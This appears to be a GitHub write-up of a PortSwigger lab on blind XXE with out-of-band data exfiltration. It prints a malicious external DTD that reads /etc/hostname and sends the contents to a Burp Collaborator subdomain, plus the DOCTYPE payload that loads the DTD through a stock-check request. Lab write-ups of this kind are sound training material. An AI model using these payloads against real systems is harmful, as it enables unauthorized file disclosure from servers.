![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/71c0b199-992c-4335-95f0-aa786cd29d0a)

### Solution

Initialy we will generate the payload with burp collaborator domain address

```js
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/e113b0cb-8101-45bc-9490-3ae4507e97e4)

url is `https://exploit-0a61008804e348d881456bed01ea003f.exploit-server.net/exploit`

now we will use the stock check feature

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/24c00e28-0104-4e51-8125-4c8aaa6d7ed2)

add this payload between the xml and stock check tag 

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/7a62248f-0717-41ff-8c54-90af81a084e8)

now when we click poll now it shows http and dns requests, The HTTP interaction could contain the contents of the /etc/hostname file.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/720fd5bd-d335-4761-a4c2-9aac2b60b06e)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/4963cdaa-e771-48e4-88d3-4e60b614a332)

lab solved succesfully

